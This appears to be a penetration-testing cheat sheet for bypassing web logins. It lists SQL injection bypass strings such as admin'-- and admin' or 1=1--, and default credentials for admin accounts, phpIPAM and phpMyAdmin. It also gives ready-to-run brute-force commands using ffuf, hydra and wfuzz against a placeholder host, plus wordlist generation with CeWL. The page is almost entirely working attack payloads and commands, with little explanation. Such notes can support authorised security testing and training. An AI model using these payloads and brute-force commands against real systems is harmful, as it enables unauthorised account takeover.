---
title: Web Login Bypass
desc: 
tags: [Burp, Ffuf, Login, SQLi, Web, Wfuzz]
alts: [API-Pentesting]
render_with_liquid: false
---

## 1. Use SQL Injections

```
admin'--
admin'#
admin' or 1=1--
admin' or '1'='1
admin' or 1=1#
```

<br />

## 2. Use Default Credentials

```sh
admin:admin
admin:password
admin:password1
admin:password123
administrator:password
administrator:password1
administrator:password123

# phpIPAM
admin:ipamadmin
Admin:ipamadmin

# PHPMyAdmin
root:(null)
root:password
```

<br />

## 3. Brute Force Credentials

1. **Prepare Wordlists**

    - **Rockyou**

        It is often located in **"/usr/share/wordlists/rockyou.txt"** in Linux.

    - **[SecLists](https://github.com/danielmiessler/SecLists){:target="_blank"}**

        It is often located in **"/usr/share/seclists"** in Linux.

    - **[CeWL](https://github.com/digininja/CeWL){:target="_blank"}**

        Generate the custom wordlist from the target web page.
    
        ```sh
        cewl https://vulnerable.com > scraped_words.txt
        ```

2. **Brute Force using Tools**

    - **Ffuf**

        ```sh
        # -fc: Filter HTTP status code
        ffuf -w passwords -X POST -d "username=admin&password=FUZZ" -u http://vulnerable.com/login -fc 401
        ```

    - **Hydra**

        ```sh
        # Cracking username
        hydra -L usernames.txt -p password vulnerable.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid username"
        # Cracking password
        hydra -l username -P passwords.txt vulnerable.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid password"

        # HTTPS (https-post-form)
        hydra -L usernames.txt -P passwords.txt vulnerable.com https-post-form "/login:username=^USER^&password=^PASS^:Username or password is incorrect"

        
        # Cracking the Authorization or WWW-Authenticate in the request header.
        hydra -L usernames.txt -P passwords.txt <target-ip> http-get
        ```

    - **Wfuzz**

        ```sh
        # Cracking username
        wfuzz -z file,./usernames.txt -d "username=FUZZ&password=password" https://vulnerable.com/login
        # Cracking password
        wfuzz -z file,./passwords.txt -d "username=admin&password=FUZZ" https://vulnerable.com/login

        # -- Options --------------------------------------------------------------------------------------------

        # --hc: Hide the specific status code
        wfuzz -z file,./usernames.txt -d "username=FUZZ&password=password" --hc 302 http://vulnerable.com/login
        # --hh: Hide the specific chars (Content-Length)
        wfuzz -z file,./passwords.txt -d "username=admin&password=FUZZ" --hh 783 http://vulnerable.com/login

        # --sc: Show the specific statuc code
        wfuzz -z file,./usernames.txt -d "username=FUZZ&password=password" --sc 302 http://vulnerable.com/login
        # --sh: Show the specific chars (Content-Length)
        wfuzz -z file,./passwords.txt -d "username=admin&password=FUZZ" --sh 1214 http://vulnerable.com/login
        ```